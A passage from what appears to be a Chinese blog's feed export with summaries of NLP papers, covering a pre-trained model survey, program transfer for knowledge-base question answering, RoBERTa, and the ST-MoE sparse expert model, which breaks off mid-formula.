Transformer 的模型，8
位量化已在 Q8BERT 中被证明是有效的，对模型性能的影响很小。为了减轻性能下降，也可以采用其他保持精度的方法。
Q-BERT (Shen et al.,2020a) 使用混合比特量化，其中 Hessian
谱较高的参数需要更高的精度，而 Hessian 谱较低的参数需要较低的精度。</p>
<h2 id="可解释性理论">可解释性 &amp; 理论</h2>
<p>鉴于 PTM 在多项任务上取得的卓越性能，研究者试图解释 PTM 的行为，包括其如何工作和捕获到了怎样的模式。这些工作涵盖了
PTM 的几个重要属性：知识、鲁棒性和结构稀疏性 / 模块化。 此外，在构建 PTM
的理论分析方面也有一些开创性的工作。</p>
<h3 id="知识">知识</h3>
<p>PTM 捕获的隐性知识大致可以分为两大类：语言知识和世界知识。</p>
<p><strong>语言知识</strong>包含了句子的语法、语义、词义等信息。与传统的神经模型如
CNN 和 RNN 相比，大规模 PTM
可以从海量的预训练数据中学习到丰富的语言知识。为了研究 PTM
的语言知识，研究人员设计了几种方法：表征分类（利用隐藏状态对句子 / 单词进行分类）、表征分析（利用隐藏状态计算统计信息，例如相似度、距离）、注意力分析（利用注意力矩阵，发现文本的层次结构）、生成分析（语言模型计算概率）。</p>
<p><strong>世界知识</strong>主要包括常识知识和事实知识。Davison
等人提出将关系三元组转化为掩码句子，根据 PTM 给出的互信息对句子进行排序，证明在其表示空间中学习了各种常识特征。Petroni
等人（2019）提出将关系知识生成表述为填空语句的完成。根据实验结果，他们发现在没有任何微调的情况下，PTM
在这项任务上明显优于以前的监督基线，证实 PTM 学习到了事实知识。但是，这些填空语句的构造并非易事。</p>
<h3 id="鲁棒性">鲁棒性</h3>
<p>近期工作通过使用对抗性样本证明 PTM 存在严重的鲁棒性问题。对抗性攻击旨在通过对原始输入的小扰动来生成被模型错误分类的新样本。
例如，PTM
很容易被同义词替换所愚弄。事实上，这个问题在 word2vec 时代就存在了。由于同义词、反义词所在上下文相似，它们的表征也近似。同时，不相关的格式词也会误导 PTM 做出错误的预测。但是高质量对抗样本的获取也面临挑战，目前的工作主要利用模型的预测概率和模型梯度来搜索对抗性样本。最近，人在回路（Human-in-the-loop）方法（Wallace
等人，2019b；Nie
等人，2020）已被应用于生成更自然、有效和多样化的对抗样本，这带来了更大的挑战和经验。总而言之，当人们为实际应用部署
PTM 时，PTM 的鲁棒性已成为严重的安全威胁。</p>
<h3 id="结构稀疏性">结构稀疏性</h3>
<p>正如前文提到的，Transformer
具有过度参数化的问题。研究人员表明，多头注意力结构在机器翻译 (Michel et
al., 2019)、抽象摘要 (Baan et al., 2019) 和语言理解 (Kovaleva et al.,
2019)
的任务中是多余的，即当去除部分注意力头，可以获得更好的性能。这种现象与
(Clark et al., 2019)
中的观察结果一致，他们发现同一层中的大多数头部具有相似的自我注意模式。他们的研究结果表明，不同头部的注意力行为可以归类为一组有限的模式。除了多头注意力之外，其他几项工作也在探索识别参数的稀疏性。
Gordon 等人 (2020) 表明，低水平的剪枝 (30-40%)
根本不会影响预训练损失或下游任务的性能。</p>
<h3 id="ptm理论">PTM 理论</h3>
<p>由于预训练在深度学习方面取得了巨大成功，研究人员试图研究预训练的工作原理，尤其是无监督预训练。在深度学习的早期，人们发现通过贪婪的逐层无监督预训练和监督微调来训练深度贝叶斯网络是有效的（Hin-ton
et al.,
2006）。最近，基于包括语言建模在内的对比学习的预训练已经成为主流方法。</p>
<p>Erhan et al.
(2010) 提出了两个假设来解释预训练的效果：（1）更好的优化和（2）更好的正则化。在更好的优化方面，与随机初始化的模型相比，预训练的网络更接近全局最小值。在更好的正则化方面，PTM 的训练误差不一定比随机模型好，而 PTM 的测试误差更好，这意味着更好的泛化能力。</p>
<p>对于预训练目标的最新发展。Saunshi, et
al（2019）对对比无监督表示学习进行了理论分析。对比学习将出现在相同上下文中的文本 / 图像对视为语义相似对，将随机采样的对视为语义不相似对。然后，相似对之间的距离应该很近，不同点之间的距离应该很远。在语言建模的预测过程中，上下文和目标词是相似对，其他词是负样本（Kong
et al., 2020）。Saunshi
等人（2019）首先提供了一个新的概念框架来弥合预训练和微调之间的差距。具体来说，他们引入了潜在类的概念，语义相似的对来自同一个潜在类。例如，潜在类可以是 “快乐” 以包括所有文本，包括快乐的情绪。潜在类涵盖所有可能的类，下游任务定义的类来自潜在类集合。然后，他们证明了对比学习的损失是下游损失的上限。因此，在优化预训练损失时，我们可以预期下游任务的损失会更低。</p>
<h2 id="未来发展方向">未来发展方向</h2>
<h3 id="架构和预训练方法">架构和预训练方法</h3>
<p>值得探索的问题有：</p>
<ul>
<li><strong>新架构。</strong>Transformer 饱受诟病的计算复杂度，需要更有效的模型捕获更长范围的依赖信息。另外，也需要根据下游任务设计特定架构，例如 NLU 使用 Transformer
Encoder，NLG 使用 Transformer Decoder。</li>
<li><strong>新的预训练任务。</strong>如何设计有效、高效的自监督任务，类似 ELECTRA。</li>
<li>不止微调。微调是将 PTM
的知识转移到下游任务的主要方法，但一个缺点是其参数效率低下：每个下游任务都有自己的微调参数。NLU 最近盛行的 Prompt 就是对微调的改进。</li>
<li><strong>可靠性。</strong>提高 PTM 的鲁棒性，免受对抗攻击。</li>
</ul>
<h3 id="多语言多模态预训练">多语言、多模态预训练</h3>
<ul>
<li>更多的模态。除了图像和文本，还可以利用视频和音频进行多模态预训练。主要挑战在于如何对这两种模态中涉及的时间上下文进行建模。</li>
<li><strong>更深刻的解释。</strong>将视觉和语言联系起来的原因仍然没有定论，只是一些经验性的感觉，没有脑科学或者深度学习理论的支撑。另外，多模态训练是否会对单模态造成损失，如何克服？这些都是悬而未决的问题。</li>
<li><strong>更多的下游任务。</strong>虽然多模态预训练可以应用于图文检索、图文生成、图文生成等下游任务。
然而，为多模态预训练找到一个 “真正的” 真实世界应用场景仍然具有挑战性。</li>
<li><strong>迁移学习。</strong>多语言模型应当灵活适配新的语言。另外，目前的多模态多语言模型无法处理音频数据，不同语言的音频需要转换为文本再翻译。</li>
</ul>
<h3 id="计算复杂度">计算复杂度</h3>
<p>大规模深度学习模型的新需求给现有的深度学习框架带来了严峻的挑战。为了开发更有效的框架，可以探索以下方向：</p>
<ul>
<li><strong>数据转移。</strong>设计精细的、定义良好的数据调度和计算策略，最小化通信成本、最大化计算和内存资源以及优化计算 - 通信重叠。</li>
<li>并行策略。从数据并行、模型并行、流水线并行以及各种混合并行方法可以根据神经网络的结构和硬件配置找到它们的最佳使用方式。在当前实践中，用户必须全面考虑给定深度学习模型的网络结构和设备间通信带宽，以决定最合适的并行策略或在不同策略之间切换（Shazeer
等，2018）。</li>
<li><strong>大规模预训练。</strong>鉴于现有深度学习框架对模型并行和流水线并行的支持不佳，一些新兴的开源项目开发了用于大规模训练的专用框架。由于应用案例优先以及存在的兼容性问题，这些方法无法共同构成完整的解决方案。</li>
<li><strong>包装器和插件</strong>。由框架提供插件或者包装器自动管理通信操作，避免用户手动编程通信的复杂过程。</li>
</ul>
<h3 id="理论基础">理论基础</h3>
<p>目前的 PTM 理论存在以下问题：</p>
<ul>
<li><strong>不确定性。</strong>PTM（以及其他深度神经网络）的一个未得到解决的问题是它们通常对预测过于自信，即这些模型不知道他们不知道什么。你问 GPT-3
“我的脚有几只眼睛”，GPT-3
肯定会给出 “你的脚有两只眼睛” 这样的答案，这看起来违反直觉。在机器学习中处理这种分布外（OOD）数据通常是一项具有挑战性的任务。为了应对上述挑战，一个有希望的方向是采用贝叶斯方法，探索概率工具来捕获数据和模型的不确定性（也分别称为任意不确定性和认知不确定性）。当然，提高贝叶斯深度学习的计算效率是解决上述挑战的关键因素。</li>
<li><strong>泛化和鲁棒性。</strong>PTM
的另一个重要问题是泛化。从理论上理解预训练在提高下游任务泛化方面的作用很重要。有没有有效的方法来探索
PTM 作为额外的数据资源来提高下游任务的鲁棒性？此外，如前所述，PTM
本身的鲁棒性是一个未解决的问题。</li>
</ul>
<h3 id="模型边缘学习">模型边缘学习</h3>
<p>模型边缘是指存储在模型中的知识。给定三元组 &lt;h,r,t&gt;，我们很容易知道头部实体 h 和尾部实体具有关系 r，但是 PTM 中的表征的意义却不明晰。越来越多的研究人员探索了
PTM
从数据中学到了哪些知识，以及为什么它们在下游任务中表现如此出色？这些模型边缘如何存储和管理？是否有可能建立一个通用连续知识库（UCKB）来存储来自各种
PTM 的模型边缘？这些都是有希望的研究方向。</p>
<h3 id="认知和知识学习">认知和知识学习</h3>
<p>让 PTM 更有知识是 PTM 未来的一个重要主题。可以将知识型 PTM
的未来发展分为以下三种方法：</p>
<ul>
<li><strong>知识增强。</strong>对于输入文本和外部知识，关键的问题是弥合文本表示和知识表示（包括符号或向量）之间的差距，并统一使用它们的信息作为输入。这个问题的解决需要统一的模型架构和知识引导的预训练目标。</li>
<li><strong>知识支持。</strong>根据输入的先验知识，设计不同的模块处理不同类型的输入，类似人脑不同区域对应不同的活动功能，加快训练和推理进程。</li>
<li><strong>知识监督。</strong>通过从知识库和大规模语料库中学习，与仅使用纯文本相比，PTM
可以具有更好的语言理解和生成能力。通过改进认知架构、明确推理、知识交互这三个方向，未来的
PTM 有望于能够轻松理解文字之外的含义。</li>
</ul>
<h3 id="应用">应用</h3>
<p>在具体应用中，PTM 还存在一些问题：</p>
<ul>
<li><strong>对话系统。</strong>虽然基于 Transformer 的开放域对话系统显示出优秀的与人对话的能力，但是在对话领域，缺少特定的预训练任务。</li>
<li><strong>特定领域的 PTM。</strong>当大规模的特定领域语料库可以廉价获得时，可以在这些数据上训练特定领域的
PTM。这种领域专业知识通常被认为对于解决许多特定领域的问题很重要。</li>
<li><strong>领域适应和任务适应。</strong>大规模 PTM
的简单微调对于特定领域的应用是不够的（Gururangan 等人，2020；Ke
等人，2020）。最根本的原因是分布变化：特定域中的数据分布可能与一般预训练文本中的<strong>数据分布</strong>有很大不同。如何弥合预训练和特定任务微调之间的差距变得至关重要。</li>
</ul>
<h2 id="总结">总结</h2>
<p>这篇综述回顾了预训练模型的发展历史、分析了其核心问题并指明了一些改进的方向。这篇论文中的一些工作我也没有接触过，像多模态、Transformer-XL 等。因此读起来也有一些一知半解。建议有余力的读者去看原文。毕竟综述类文章本身就是知识的压缩，很难在博客中再进行压缩了。这也是我为什么这篇博客完全按照原论文格式排版。。。</p>
<p>最后，新年快乐！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.jiqizhixin.com/articles/2021-09-07-3">国内数十位 NLP 大佬合作，综述预训练模型的过去、现在与未来
| 机器之心 (jiqizhixin.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/84159401">Transformer-XL 介绍 -
知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/132561405#:~:text=模型量化在最初的定义里是为了压缩模型参数，比如韩松在ICLR2016上获得best%20paper的论文，首次提出了参数量化方法。.,其使用k-mean聚类，让相近的数值聚类到同一个聚类中心，复用同一个数值，从而达到用更少的数值表示更多的数，这是量化操作的一种方案。.%20反过来，从量化数变到原始数的过程，称之为反量化，反量化操作完之后，模型就可以按照原来的方式进行正常的计算。.%20我们认为绝大部分的模型量化算法都能压缩参数，因此压缩参数的实用性不存在问题。.">模型量化了解一下？
- 知乎 (zhihu.com)</a></li>
<li><a href="https://www.jiqizhixin.com/articles/2016-10-18-7">人类智慧与机器学习结合──微软的「Human-in-the-Loop」
| 机器之心 (jiqizhixin.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>综述</category>
      </categories>
      <tags>
        <tag>BART</tag>
        <tag>预训练模型</tag>
        <tag>BERT</tag>
        <tag>自然语言处理</tag>
        <tag>综述</tag>
        <tag>GPT</tag>
      </tags>
  </entry>
  <entry>
    <title>复杂知识库问答（KBQA）中的问题迁移</title>
    <url>/blog/2022/03/13/Program-Transfer/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>《Program Transfer for Answering Complex Questionsover Knowledge
Bases》是由清华大学和华为合作完成的工作，收录于 ACL
2022 长文中。该文试图通过一个两阶段的方法来完成 KBQA 任务：解析器将 query 解析为知识库操作序列（无参数），参数分析器为每个操作填入参数。通过在复资源知识库预训练，显著提升了在低资源知识库上的 KBQA 性能。
<span id="more"></span></p>
<p>本文所讲的方法是语义解析的思想，将 query 先转化为知识库的操作序列，如下图所示。分析出 query 对应的操作序列（Find，Relate..），再为每个操作填入参数（实体、关系等），执行操作即可得到结果。</p>
<p><img src="example.png"></p>
<h2 id="背景">背景</h2>
<p>知识库问答，即 KBQA，旨在利用结构化的知识库来解答 query。在<a href="https://tqnwhz.github.io/blog/2021/10/25/KBQA-survey/#more">基于知识库的问答综述（KBQA）</a>中提到了，KBQA 有两种主流方法，<strong>语义解析</strong>的方法将 query 转化为 SQL 语句，执行即可得到结果；信息检索的方法在特定子图中将实体按相关性排序，最终得到结果。复杂 KBQA 是指需要处理多跳逻辑的 KBQA 问题。这种情况下，KBQA 所面临的推理路径的监督数据缺失、语义理解能力不足、检索空间过大等问题会更为突出。</p>
<p>程序规约是指将 KBQA 问题规约为某个可执行的程序，也就是语义解析的思想。近些年来，一些知识库提供了监督的程序规约信号，在这些知识库上的程序规约问答取得了大幅性能提升。如何使用这些监督信号，提升低资源知识库上的性能呢？本文将其定义为程序迁移任务，该任务面临以下挑战：</p>
<ul>
<li><strong>域异构</strong>：由于语言和知识的多样性，源知识库和目标知识库上的知识、问题的表现形式可能相去甚远。</li>
<li><strong>未知的元素</strong>：源知识库的知识覆盖率往往相当有限，例如 KBQA
Pro 数据集只覆盖了 3.9% 的关系和 0.24% 的维基百科概念。</li>
<li><strong>过大的搜索空间</strong>：每个知识库操作可选的参数很多，搜索知识库和操作和可选参数不现实。</li>
</ul>
<p>本文的贡献包括：</p>
<ul>
<li>首次提出复杂 KBQA 的程序迁移方法</li>
<li>为程序迁移提出一个两阶段解析框架和本体剪枝策略</li>
<li>通过扩展实验和消融实验证实了程序迁移的有效性</li>
</ul>
<h2 id="框架结构">框架结构</h2>
<p>这一部分其实非常简单，对着下面这张图就能解释清楚，不需要任何数学公式。</p>
<p><img src="framework.png"></p>
<ol type="1">
<li>BERT+GRU 将 query 映射为无参数操作序列（与知识库无关）</li>
<li>利用上一步每个操作的 hidden
state 投影后在可选参数空间做 softmax，选择参数</li>
<li>参数剪枝：根据 query 维护可能的域、关系、实体集合，并随着参数序列的自回归过程迭代更新。</li>
</ol>
<h3 id="源域预训练">源域预训练</h3>
<p>损失函数包含两部分：操作序列的交叉熵和参数位置的交叉熵，即两个分类任务损失之和。
<span class="math display">\[
\mathcal {L}^{pretrain}=-\sum_{(x^S,y^S)\in
D^S}(logp(y^S_s|x^S)+\sum_{t=1}^{|y_s|}logp(arg_t^S|x^S,o_t^S,\mathcal
P))
\]</span></p>
<h3 id="目标域微调">目标域微调</h3>
<p>由于目标域缺少源域的监督程序归纳信号，因此需要通过强化学习 / EM 算法来微调。主要步骤是先搜索得到若干个可能的程序，然后执行程序根据结果更新参数。</p>
<h2 id="实验">实验</h2>
<h3 id="数据集">数据集</h3>
<ul>
<li>源域：KBQA Pro</li>
<li> 目标域：WebQuestionSP，ComplexWebQuestions (CWQ)</li>
<li> 知识库：Freebase</li>
</ul>
<h3 id="基线">基线</h3>
<ul>
<li>语义解析：TEX-TRAY，QGG，TeacherNet</li>
<li> 信息检索：Graft-Net，PullNet</li>
<li> 消融实验基线：<span class="math inline">\(Ours_{-f}\)</span>（未微调），<span class="math inline">\(Ours_{-p}\)</span>（未预训练），<span class="math inline">\(Ours_{-pa}\)</span>（未预训练参数解析器），<span class="math inline">\(Ours_{-o}\)</span>（缺少本体剪枝）</li>
</ul>
<h3 id="评估指标">评估指标</h3>
<ul>
<li>F1</li>
<li>Hits@1：Hits@n 是指正例中处在前 n 个结果中的比例，Hits@1 也就是模型结果第一名为正确结果的比例</li>
</ul>
<p>由于数据集中的问题有多个答案，F1 更好地反映了答案的覆盖程度。</p>
<h3 id="实验结果">实验结果</h3>
<p><img src="exper-result.png"></p>
<p>值得关注的是<span class="math inline"> \(Ours_{-p}\)</span> 极差的结果和<span class="math inline"> \(Ours_{-f}\)</span> 的一般表现，表明了预训练的重要性。并且移去预训练参数解析器和本体剪枝策略都会对模型效果有较大影响。</p>
<h2 id="总结">总结</h2>
<p>这篇论文还是蛮有意思的，用一个比较贴近人认知的框架，把迁移学习应用到 KBQA 中并证实了其有效性。</p>
<p>近期还会从各高校 ACL2022 录取宣传中找一些值得读的论文。等到 ACL
2022 公布 accepted list 了就不用这么折腾了。</p>
<p>碎碎念：我也好想发一篇论文啊。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>问答</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>问答</tag>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>RoBERTa</title>
    <url>/blog/2021/09/03/RoBERTa/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>RoBERTa 是华盛顿大学和 FaceBook 在论文《RoBERTa: A Robustly Optimized
BERT Pretraining
Approach》提出的预训练模型，论文似乎仅存在 arxiv 版本。RoBERTa 本质上是 BERT 的一个改进版本。论文发现 BERT 是未充分训练的，改进训练之后的 RoBERTa 在 GLUE、RACE、SQuAD 数据集上达到了 SOTA。代码和模型公开在了 <a href="https://github.com/pytorch/fairseq">github</a> 上。</p>
<span id="more"></span>
<p>相对于 BERT 的修改主要有以下方面：</p>
<ul>
<li>训练时间更长、数据更大（提出了一个新的数据集 CC-News）、batch 更大（有论文指出更大的 batch 模型训练结果越好）</li>
<li>移除下句预测预训练任务</li>
<li>训练序列更长</li>
<li>动态改变数据的 MASK，而 BERT 的 MASK 是固定的</li>
</ul>
<p>在不使用额外的训练数据的情况下，RoBERTa 在 GLUE 和 SQuAD 数据集上取得了优于 BERT 的性能。引入额外的训练数据后，RoBERTa 在 GLUE 中的四项任务、SQuAD、RACE 数据集上达到了 SOTA。</p>
<h2 id="实验">实验</h2>
<h3 id="数据集">数据集</h3>
<ul>
<li>GLUE（ General Language Understanding
Evaluation，通用语言理解评估）：由 9 个句子或句子对的分类任务组成。</li>
<li>SQuAD（ Stanford Question Answering
Dataset，斯坦福问答数据集）：抽取式问答任务。给出文档和问题，从文档中选择部分文本作为问题答案。</li>
<li>RACE（ ReAding Comprehension from
Examinations，考试阅读理解数据集）：顾名思义，数据集来自考试题目，是一个分类任务。单个样本由文档、问题和若干个候选答案组成。正确答案不一定直接体现在文章中，需要深层理解文章并进行推断。</li>
</ul>
<h3 id="静态掩码vs动态掩码">静态掩码 vs 动态掩码</h3>
<p>论文将 RoBERTa 与参数量相近的<span class="math inline"> \(BERT_{BASE}\)</span> 进行了比较，结果如下所示。可以看出，动态掩码的效果与静态掩码持平或者略优于。个人猜测原因是动态掩码虽然能够使得模型模型接触到更多数据、更加鲁棒，但频繁的动态掩码会使得某些样本无法得到充足的训练。</p>
<p><img src="mask-result.png"></p>
<h3 id="下句预测">下句预测</h3>
<p>下句预测任务是 BERT 中提出的预训练任务，用于判断两句话是否构成连续上下句的关系。BERT 论文中认为下句预测任务是非常重要的，它提升了 QNLI、MNLI、SQuAD 数据集的性能。然而，一些工作开始质疑下句预测任务的有效性。RoBERTa 论文中比较了以下几种训练方法：</p>
<ul>
<li>句子段（连续多个句子）对 + 下句预测，也就是原版 BERT 的训练方法。</li>
<li>句子对 + 下句预测。</li>
<li>跨文档完整句子，将多篇文档拼接在一起，从中连续采样句子，可能跨文档也可能来自同一篇文档。</li>
<li>单文档句子，从单个文档中连续采样句子。</li>
</ul>
<p>实验结果如下：</p>
<p><img src="nsp.png"></p>
<p>前两种训练方法比较，前者优于后者，说明独立的句子会损害下流任务的性能。接下来比较有无 NSP 任务的训练方法，分析后可以看出，完整句子移除了 NSP 任务，与拥有 NSP 任务的性能基本持平，在某些任务上还略胜一筹。而单文档句子任务甚至优于跨文档完整句子。</p>
<h3 id="更大的batch">更大的 Batch</h3>
<p>机器翻译上的部分工作证实了大 batch-size 能够同时提高优化速度和任务性能，近期工作证实这同样适用于 BERT，论文在<span class="math inline"> \(BERT_{BASE}\)</span> 上进行了 Batch-size 的实验，结果如下：</p>
<p><img src="batch-size.png"></p>
<p>可以看出，2k 的 batch size
确实要优于 256，但 8k 却差于 2k。论文中也没有进行解释，迷惑。</p>
<h3 id="文本编码">文本编码</h3>
<p>字节对编码（Byte-Pair
Encoding）是一种字词模型，BERT 使用它来构建词表。然而当语料规模很大时，unicode 字符会占据词表中相当大部分。2019 年 GPT2 论文指出，可以使用 unicode 字节而非 unicode 字符来作为基本字词单元，然而这种方法可能会有轻微的性能损失（毕竟破坏了字符的完整结构），但是由于其能减小词表规模，RoBERTa 还是基于此进行的词表构建。</p>
<h2 id="roberta">RoBERTa</h2>
<p>RoBERTa=BERT + 动态掩码 + 跨文档完整句子 + 更大 batch
size + 字节编码 + 更大数据 + 更长训练时间</p>
<p>实验结果如下：</p>
<p><img src="roberta.png"></p>
<p>控制训练数据时，RoBERTa 已经优于<span class="math inline"> \(BERT_{LARGE}\)</span> 了（但在 SQuAD 上逊于 XLNET），在增加数据和训练更长时间后，三个数据集上全面超越 XLNET。</p>
<p>后面就是 GLUE、SQuAD 上各项指标的实验和比较了，基本 RoBERTa 也是最优的，这里就略去了。</p>
<h2 id="总结">总结</h2>
<p>RoBERTa 可以看作是 BERT 真正的完全体吧，弥补了原生 BERT 的缺陷。可能是因为创新性不足？没有被会议接受。看来预训练模型也还是很卷的。。。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>BERT</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>BERT</tag>
        <tag>RoBERTa</tag>
      </tags>
  </entry>
  <entry>
    <title>ST-MoE: 高效稀疏专家网络</title>
    <url>/blog/2022/06/12/ST-MoE/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>上篇回顾了经典论文专家混合网络 MoE，今天读一篇 Google 团队在 22 年 2 月出炉的大作《ST-MoE:
Designing Stable and Transferable Sparse Expert
Models》，旨在解决训练过程中的不稳定性以及微调过程中的质量不确定性。论文提出的 269B 的稀疏模型，计算成本与 32B 的密集模型相当。稀疏模型第一次在迁移学习中实现了 SOTA。</p>
<span id="more"></span>
<p>值得一提的是，谷歌的大牛 Jeff Dean 也是该论文的作者之一。</p>
<h2 id="简介">简介</h2>
<p>稀疏专家网络，根据输入激活网络的不同子部分，可以更高效地增加模型容量，可参考 <a href="https://tqnwhz.github.io/blog/2022/06/05/MoE/#more">MoE：通过条件计算增加模型容量
| 一隅
(tqnwhz.github.io)</a>。简单来说，稀疏专家网络为每个 token 动态地选择模型参数，同时保证其 FLOPs 基本恒定（例如选择固定的专家数目），这允许网络极大地扩展参数数量。相较于同规模的静态网络，稀疏专家网络可有 4-7 倍的预训练加速，训练成本减少了一个数量级。性能上，该方法产生了 SOTA 的翻译模型，使用 GPT-3
1/3 的训练成本达到了同等级的单样本学习性能。</p>
<p>然而，问题依然存在。研究人员发现使用预训练的专家网络在常见基准上微调时，其性能逊于较小的模型，例如 SuperGLUE。也就是说，其迁移学习能力较差。Switch-XXL，一个参数更少但计算量大
8 倍（FLOPs 大约等于最大的 T5
模型）的模型，提高了自然语言理解任务的质量。然而，有研究指出，预训练中的不稳定性可能妨碍了必要的预训练，例如参数和计算的必要平衡。如何可靠地训练专家网络还是个悬而未决的问题。</p>
<p>本文的贡献总结如下：</p>
<ul>
<li>对稳定性 - 质量权衡进行了大规模研究</li>
<li>引入路由 z-loss，解决了不稳定问题，并略微提升了质量</li>
<li>稀疏和密集模型的微调分析，分析其对批量大小和学习率等超参数的敏感性。糟糕的超参数实际上不会导致密集模型的微调增益，尽管有很大的预训练速度提升。</li>
<li>在分布式设置中设计帕累托高效稀疏模型的架构、路由和模型设计原则。</li>
<li>跨专家层跟踪 token 路由决策的定性分析。</li>
<li>一个 269B 稀疏模型（<strong>S</strong>table
<strong>T</strong>ransferable
<strong>M</strong>ixture-<strong>o</strong>f-<strong>E</strong>xperts 或
ST-MoE-32B），它在各种自然语言基准测试中实现了最先进的性能。</li>
</ul>
<h2 id="训练稳定性研究">训练稳定性研究</h2>
<p>训练的稳定性，定义为训练 loss 的发散程度。下图为两个同规模 FLOPs 的稀疏模型的 loss 变化。左侧为不稳定训练，右侧为稳定训练的例子。</p>
<p><img src="stability-example.png"></p>
<p>虽然可以使用一些简单的方法提升稳定性，例如更严格的梯度裁剪、任意小的学习率，但是这往往会损害模型质量。论文将提高稳定性的方法分为以下几类进行研究：</p>
<ul>
<li>消除乘法交互</li>
<li>引入模型噪声</li>
<li>限制激活和梯度</li>
</ul>
<p>构建这项研究的主要问题是小型模型很少不稳定，但大型不稳定模型成本太高而无法运行足够的步骤和种子。与
T5-XL 匹配的稀疏模型 FLOP 是很好的研究对象，因为它在大约 1/3
的运行中不稳定，但训练成本相对低廉。论文使用 6 个随机种子，每个模型都使用掩码语言建模目标在
mC4 上进行了 20k 步的预训练。</p>
<h3 id="移除乘法交互">移除乘法交互</h3>
<p>论文展示并分析 Transformers 中两个乘法交互实例的影响。</p>
<p>GELU 门控线性单元 (GEGLU)：一种激活函数，公式如下： <span class="math display">\[
FFN_{GEGLU}(x,W,V,b,c)=GELU(xW+b)\odot(xV+c)
\]</span> 均方根尺度（Root Mean Square
Scale）参数。RMS 归一化中的均方根尺度参数。RMS 归一化公式如下： <span class="math display">\[
y_i=\frac{x_i}{\sqrt{\frac1d \sum_{i=1}^d x_i^2}}\cdot g_i
\]</span> 结果如下所示。移除 GEGLU 层或 RMS
尺度参数都提高了稳定性，但对模型质量造成了重大损失。这些尺度参数 (g)
对模型质量与其他地方的参数（例如 FFN）相比具有不成比例的增益。 Shleifer
等人 (2021) 发现在 Transformers
的残差连接中添加一个学习的乘法标量会使它们更加不稳定。</p>
<p><img src="remove-multiplication.png"></p>
<h3 id="添加噪声">添加噪声</h3>
<p>一般认为，在模型中添加噪声可以提高训练稳定性（Neelakantan et al.,
2015）。而且通过 dropout
注入噪声的微调很少出现不稳定的情况，论文研究了噪声是否可以提高稀疏模型的稳定性。</p>
<p>结果如下表所示，可以看到，稳定性的提升依然是以质量为代价的。</p>
<p><img src="noise.png"></p>
<h3 id="约束激活和梯度">约束激活和梯度</h3>
<p>稳定神经网络最成功的方法之一是对激活和梯度的约束。一种流行的方法是通过反向传播时裁剪梯度以避免梯度爆炸。接着是激活的约束，论文认为，路由器（也就是 MoE 里的门控网络），以 float32 精度计算专家的概率分布。这在更大的模型规模上不足以产生可靠的训练。为了解决这个问题，
论文引入了路由 z-loss，公式如下： <span class="math display">\[
L_z(x)=\frac 1 B \sum_{i=1}^B(log \sum_{j=1}^N e^{x_j^{(i)}})^2
\]</span> 其中，<span class="math inline">\(B\)</span> 是 batch 中 token 数量，<span class="math inline">\(N\)</span> 是专家的数量，<span class="math inline">\(x\in\mathcal R^{ B\times
N}\)</span> 是路由器接收的 logits。该 loss 惩罚了门控网络中的大的 logits，类似 l2 正则项。</p>
<p>结果如下表所示，严格的梯度裁剪会损害性能，而路由
z-loss 则不会。论文中使用的 z-loss 的权重为 0.001。</p>
<p><img src="clip-z-loss.png"></p>
<h2 id="微调">微调</h2>
<h3 id="过拟合假设">过拟合假设</h3>
<p>论文认为，稀疏模型微调效果差的原因是其倾向于过拟合。论文在 SuperGLUE 中的两个任务进行了实验。下图为
Dense L 和 ST-MoE-L 模型的微调结果。每个模型都在来自 C4 语料库的 500B
个 token 上进行了预训练。可以看出，稀疏模型更快地收敛到 100%
的训练集精度，证实稀疏模型在数据分布变化时可以高效地适应优化。在更大的任务
ReCORD
上，稀疏模型的验证质量随着训练的提升而显着超过密集模型。然而，在较小的任务
CB 上，稀疏模型在保留数据上落后于密集模型。</p>
<p><img src="overfit.png"></p>
<p>基于此，适度的 dropout 可以提升稀疏模型的泛化性能，实验结果如下图所示。</p>
<p><img src="dropout.png"></p>
<h3 id="微调参数子集">微调参数子集</h3>
<p>为了防止过拟合，论文在微调期间尝试仅更新模型参数的子集：</p>
<ul>
<li>所有参数 (All)</li>
<li> 仅非 MoE 参数 (Non MoE)</li>
<li> 仅 MoE 参数 (MoE)</li>
<li> 仅 self-attention 和 enc-dec attention 参数 (Attention)</li>
<li> 仅非 MoE FFN 参数 (FFN)</li>
</ul>
<p>结果如下图所示，其中 3 个结果大致相同，而仅微调 MoE
参数会导致质量急剧下降。更新非 MoE 参数的效果、更新所有参数、仅更新 FFN
参数的效果差不多。只有更新非 MoE
参数才能成为加速和减少微调内存的有效方法。</p>
<p><img src="subset-fintuning.png"></p>
<h3 id="超参数">超参数</h3>
<p>论文研究两个超参数：批大小 和学习率对稀疏模型和密集模型微调的影响。在
C4 的 500B 个 token 上预训练 Dense-L 和 ST-MoE-L，然后在 SuperGLUE
上进行微调。结果如下图所示。</p>
<p><img src="batch-size-lr.png"></p>
<p>在所有超参数设置中，稀疏模型（橙色）的性能优于密集模型（蓝色）—— 然而，每个模型的最佳设置都可以显着改变结果。稀疏模型和密集模型在不同的批量大小和学习率下具有截然不同的性能。稀疏模型受益于更小的批量大小和更高的学习率。论文指出了在微调过程中正确调整批量大小和学习率的重要性。<strong>简单地使用适用于密集模型的相同微调超参数可以掩盖稀疏模型获得的任何预训练改进</strong>。换而言之，不能直接将密集模型的超参数照搬到稀疏模型微调上。</p>
<h3 id="丢弃token的健壮性">丢弃 token 的健壮性</h3>
<p>稀疏模型将 token 路由给每一层的一个或多个专家。为了使这些模型在现代硬件的
SPMD
范式中高效，专家容量（每个专家处理的 token 数量）需要提前固定。当专家收到的 token 超过其容量时，多余的 token 将被丢弃。论文使用辅助损失进行预训练，尽量向每个专家发送等量的 token 和容量因子（Capacity
Factor）。专家的容量为<span class="math inline"> \(CF\cdot
